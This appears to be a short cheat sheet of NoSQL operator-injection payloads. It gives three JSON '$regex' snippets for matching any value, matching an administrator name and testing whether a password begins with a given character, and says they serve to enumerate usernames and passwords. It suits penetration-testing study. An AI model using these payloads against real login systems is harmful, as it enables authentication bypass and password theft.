# Regular Expression Payloads

## Match Any Value

```json
{
  "$regex":"^.*"
}
```

---

## Match Administrator

```json
{
  "$regex":"admin.*"
}
```

---

## Password Begins With "a"

```json
{
  "$regex":"^a.*"
}
```

---

# Purpose

Use `$regex` to:

- Match usernames
- Enumerate passwords
- Test authentication

---

# Key Takeaways

- Regular expressions enable character-by-character testing.
- `$regex` is frequently useful during operator injection.